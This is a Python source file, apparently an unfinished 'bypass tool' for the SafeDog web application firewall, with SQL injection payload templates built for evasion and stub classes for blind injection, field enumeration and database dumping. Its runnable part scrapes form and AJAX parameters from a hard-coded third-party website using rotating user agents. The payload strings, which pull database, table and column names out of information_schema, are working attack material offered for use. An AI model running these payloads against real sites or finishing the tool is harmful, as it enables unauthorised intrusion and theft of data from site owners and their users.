#coding:utf-8




'''
安全狗各版本绕过工具.
'''



logo = """

 _____               __        __    _____ 
|  ___|   _ ________ \ \      / /_ _|  ___|
| |_ | | | |_  /_  /  \ \ /\ / / _` | |_   
|  _|| |_| |/ / / /    \ V  V / (_| |  _|  
|_|   \__,_/___/___|    \_/\_/ \__,_|_|   

"""

logo = '\033[1;33m' +'{}'.format(logo)+ '\033[0m'


# import urllib
import random
import re
import requests
import dis
import argparse
from lxml import etree













def mian():
    parser = argparse.ArgumentParser(description="Bypassing Security Dog.")
    parser.add_argument('--version','-v',action='store_true',help='Cat version.')
    parser.add_argument('--encodes','-e',help='HTML Doc Coding method.[-e utf-8]')
    args = parser.parse_args()
    return args




def Judgement_encode():
    args = mian()
    return args.encodes



class Payload1(object):
    #attribute
    b = "hello -> b"

    #空格绕过
    Blank_space1 = ["%20","%09","%0a","%0b","%0c","%0d","%a0","%00"]
    Blank_space2 = "/*{}*/"
    Blank_space3 = " "
    #使用浮点数绕过
    floats = None
    #使用括号绕过
    brackets1 = [""]
    brackets2 = "({})"
    #使用十六进制绕过
    hex_qm1 = "0x{}"
    #逗号绕过
    comma1 = "from"
    comma2 = "offset"


class Payload2(object):
    '''针对4.0版本'''
    a = "hello -> a"
    
    payloads1 = ["Xor True","Xor False","%26%26 true","%26%26 false"]
    payloads2 = "/**//*!order*//**/by/**/{}"

    payloads3 = "%20%26%26%20(length(database/**/())={}"
    payloads4 = "%20%26%26%20(length(hex(database/**/()))={}"
    payloads5 = "%20%26%26%20(left(hex(database/**/()),{})={}"

    payloads6 = "%20%26%26%20(1=(select%20count(/*!{}*/)%20from%20information_Schema.tables%20where%20table_schema=0x{}))"
    payloads7 = "%20%26%26%20hex/**/(substr((select%20concat(/*!{}*/)%20from%20information_schema.taBles%20where%20table_schema=0x{}%20limit%20{}),{}))"
    payloads8 = "%20%26%26%20hex/**/(substr((select%20concat(/*!{}*/)%20from%20information_schema.taBles%20where%20table_schema=0x{}%20limit%20{}),{}))={}"

    payloads9 = "%20%26%26%20hex/**/(substr((select%20concat(/*!{}*/)%20from%20information_schema.Columns%20where%20table_name=0x{}%20limit%20{}){}))"
    payloads10 = "%20%26%26%20hex/**/(substr((select%20concat(/*!{}*/)%20from%20information_schema.Columns%20where%20table_name=0x{}%20limit%20{}){}))={}"

    payloads11 = "%20%26%26%20(1=(select%20count(/*!{}*/)%20from%20{}))"
    payloads12 = "%20%26%26%20hex/**/(substr((select%20concat(/*!{}*/)%20from%20{}%20limit%20{}){}))" 
    payloads13 = "%20%26%26%20hex/**/(substr((select%20concat(/*!{}*/)%20from%20{}%20limit%20{}){}))={}"

    
# s = Payload2()
# p = s.payloads3
# pp = p.format("",4)
# print(pp)


# class Payload3(object):
#     c = "hello -> c"

class RePLace(Payload1,Payload2):
    '''针对4.0 payload替换.'''
    payloads = list

    def __init__(self):
        # print(self.b)
        # print(self.a)
        pass

    def payload(self):
        pass

    def replace(self):
        #Make payload
        pass




class Blind_injection(RePLace):
    '''针对4.0盲注'''
    def ZRDCS(self):
        '''注入点测试'''
        # %26 -> &
        pass

    def PDSJKCD(self):
        '''判断数据库长度'''
        pass

    def HQSJKM(self):
        '''获取数据库名'''
        pass

    def PDLBCD(self):
        '''判断列表长度'''
        pass

    def HQLBM(self):
        '''获取列表名'''
        pass

    def PDZDCD(self):
        '''判断字段长度'''
        pass

    def HQZDNR(self):
        '''获取字段内容'''
        pass
    
class Ordinary_injection(RePLace):
    '''普通注入'''
    def Injection_Point(self):
        #判断注入点
        pass

    def ZFDS(self):
        #判断字符段数
        pass

    def KSSZD(self):
        #寻找可显示的字段
        pass

    def CSJKM(self):
        #查数据库名
        pass

    def CBM(self):
        #查表名
        pass

    def CZDM(self):
        #查字段名
        pass

    def CZDSJ(self):
        #查字段数据
        pass


def TK(self):
    '''脱库'''
    pass


def WAF_Inspect():
    pass


# print('\033[1;33m' + '******************************' + '\033[0m')
# print(logo)

class Find_Parameter(object):
    

    def __init__(self,url):
        self.url = url

    def req(self):
        headers = get_headers()
        r = requests.get(self.url,headers=headers)
        encodes = Judgement_encode()
        r = r.content.decode(encodes)
        r = r.split('>')
        return r

    def Find_name(self):
        r = self.req()
        pattern = re.compile(r'<input.*')
        #查找属性name值.
        for r in r:
            result1 = pattern.findall(r)
            # print(result1)
            for v in result1:
                s1 = v.split(' ')
                for s1 in s1:
                    if 'name' in s1:
                        s1 = s1.split('=')
                        s1 = s1[1].split('"')
                        for s1 in s1:
                            if s1:
                                s1 = s1
                                yield s1


    def Find_method(self):
        r = self.req()
        pattern = re.compile(r'<form.*')
        #查找属性method值.
        for r in r:
            if 'post' not in r and 'POST' not in r and 'get' not in r and 'GET' not in r:
                return('POST','post')
            result1 = pattern.findall(r)
            for v in result1:
                s1 = v.split(' ')
                for s1 in s1:
                    if 'method' in s1:
                        s1 = s1.split('=')
                        s1 = s1[1].split('"')
                        for s1 in s1:
                            if s1:
                                if 'post' in s1:
                                    return 'post'
                                elif 'get' in s1:
                                    return 'get'
                                elif 'POST' in s1:
                                    return 'POST'
                                elif 'GET' in s1:
                                    return 'GET'
                        

    #
    def Find_reqajax_parameter(self):
        self.kt_j = []
        self.zj_j = []
        self.zj_z = []
        self.jw_z = []
        headers = get_headers()
        r = requests.get(self.url,headers=headers)
        encodes = Judgement_encode()
        r = r.content.decode(encodes)
        html=etree.HTML(r,etree.HTMLParser())
        result=html.xpath('//script/text()')
        for v in result:
            # print(v)
            pattern = re.compile(r'data:.*')
            result1 = pattern.findall(v)
            # print('-> ',result1)
            try:
                result1 = result1.split(',')
            except:
                for result1 in result1:
                    if result1:
                        # print('1 -> ',result1)
                        # print('1 -> ',type(result1))
                        for result1 in result1.split(':'):
                            if result1:
                                result1 = result1.split(',')
                                for result1 in result1:
                                    if result1:
                                        # print(result1)
                                        #Key matching the beginning.
                                        if '{' in result1:
                                            if result1:
                                                result2 = result1.strip()
                                                #Find {
                                                f = result2.find('{')
                                                f1 = result2[f:].strip()
                                                if '{}' not in f1:
                                                    f1 = f1.strip('{').strip('"').strip()
                                                    self.kt_j.append(f1)
                                                    
                                    
                                    #Matching Intermediate key or value.
                                    if '{' not in result1 and '"' in result1:
                                        if result1:
                                            if '"' in result1:
                                                result2 = result1.strip().strip('"')
                                                self.zj_j.append(result2)

                                    if '{' not in result1 and '"' not in result1:
                                        if result1:
                                            if '}' not in result1:
                                                result2 = result1.strip()
                                                self.zj_z.append(result2)

                                    #Match the endpoint value
                                    if '}' in result1 and '"' not in result1:
                                        if result1:
                                            if '{}' not in result1:
                                                f1 = result1.strip('}').strip()
                                                self.jw_z.append(f1)
                                            
        # print(self.kt_j[0])
        # # print(zj_z)
        # print(self.zj_j)
        # # print(jw_z)
                                            





    # def Judgement_encode(self):
    #     """Judgement html doc encode."""
    #     headers = get_headers()
    #     r = requests.get(self.url,headers=headers)
    #     r = r.text
    #     pattern = re.compile(r'<meta.*')
    #     result1 = pattern.findall(r)
    #     for result1 in result1:
    #         result1 = result1.split(' ')
    #         for result1 in result1:
    #             if 'charset' in result1:
    #                 result1 = result1.split('=')
    #                 result1 = result1[1].strip().strip('"')
    #                 return result1
                
    


# def req_():
#     f = Find_method("https://primarymaths.ephhk.com/pages/contain.php")
#     if 'POST' in f or 'post' in f or 'GET' in f or 'get' in f:
#         pass






useragents = [
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36'
    },
    {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36'
    },
    {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36'
    },
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36'
    },
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246'
    },
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1'
    },
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0'
    },
    {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0'
    },
    {
        'User-Agent': 'Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0'
    },
    {
        'User-Agent': 'Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0'
    },
    {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1'
    },
    {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A'
    },
    {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2'
    }
]


def get_headers():
    """return ramdomly chosen useragent"""

    return random.choice(useragents)


class test(Find_Parameter):

    def __init__(self,url):
        self.url = url

    def test(self):
        self.Find_reqajax_parameter()
        print(self.kt_j)
        print(self.zj_j)
        print(self.jw_z)











if __name__ == "__main__":
    args = mian()
    if args.version:
        print(logo)
        print('v1.1')
    
    # s = Find_Parameter('https://primarymaths.ephhk.com/pages/contain.php')

    # s2 = s.Find_method("https://primarymaths.ephhk.com/pages/contain.php")
    # print(s1)
    # s2 = s.Find_method("https://www.baidu.com")
    # s2 = random.choice(s2)
    # print(s2)
    s = test('https://primarymaths.ephhk.com/pages/contain.php')
    s.test()
    
  

















